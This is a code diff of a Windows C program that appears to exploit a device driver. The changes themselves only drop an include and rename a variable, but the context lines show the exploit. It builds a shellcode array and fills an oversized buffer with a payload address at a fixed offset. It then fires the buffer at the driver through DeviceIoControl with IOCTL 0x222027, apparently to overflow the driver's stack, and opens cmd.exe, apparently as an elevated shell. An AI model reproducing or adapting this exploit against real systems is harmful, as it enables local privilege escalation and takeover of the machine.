@@ -1,4 +1,3 @@
-#include "stdafx.h"
 #include <Windows.h>
 #include <stdio.h>
 #include <winioctl.h>
@@ -19,7 +18,7 @@ int main()
 		return 1;
 	}
 
-	DWORD outBytes = 0;
+	DWORD u = 0;
 	
 	char pl[66] = 
 		"\x60" 
@@ -53,7 +52,7 @@ int main()
 	memcpy(Buff + 0x828, plAddress, 4);
 	memcpy(Buff + 0x830 - 4, "\xb0\xb0\xd0\xba", 4);
 
-	DeviceIoControl(dev, 0x222027, &Buff, 0xFFFFFFFF, NULL, 0, &outBytes, (LPOVERLAPPED)NULL);
+	DeviceIoControl(dev, 0x222027, &Buff, 0xFFFFFFFF, NULL, 0, &u, (LPOVERLAPPED)NULL);
 	system("cmd.exe");
 	CloseHandle(dev);
 	system("pause");
